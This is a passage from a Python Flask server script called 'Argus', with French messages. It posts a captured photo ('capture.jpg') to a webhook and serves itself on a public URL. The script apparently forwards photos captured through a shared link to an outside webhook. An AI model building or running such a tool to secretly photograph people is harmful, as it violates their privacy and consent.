                        'file': ('capture.jpg', image_bytes, 'image/jpeg'),
                        'payload_json': (None, json.dumps(simple_payload), 'application/json')
                    }
                    
                    response_simple = requests.post(
                        webhook_url,
                        files=files_simple,
                        timeout=30
                    )
                    
                    if response_simple.status_code in [200, 204]:
                        print("🎉 Photo envoyée avec succès (méthode simple) !")
                        return 'OK'
                    else:
                        print(f"❌ Erreur méthode simple: {response_simple.text}")
                        return f'Erreur: {response_simple.text}', 400
                        
                except Exception as e:
                    print(f"❌ Erreur lors de la tentative simple: {e}")
                    return f'Erreur: {str(e)}', 400
        
        else:
            print(f"❌ Plateforme non supportée: {platform}")
            return f'Erreur: Plateforme non supportée', 400
            
    except Exception as e:
        print(f"💥 Erreur lors de l'envoi: {e}")
        return f'Erreur: {str(e)}', 500

if __name__ == '__main__':
    print("🚀 Démarrage du serveur Argus...")
    print("📍 Adresse locale: http://localhost:5000")
    
    if public_url:
        print(f"🌐 Adresse publique: {public_url}")
    else:
        print("⏳ Génération de l'URL publique...")
    
    app.run(host='0.0.0.0', port=5000, debug=False)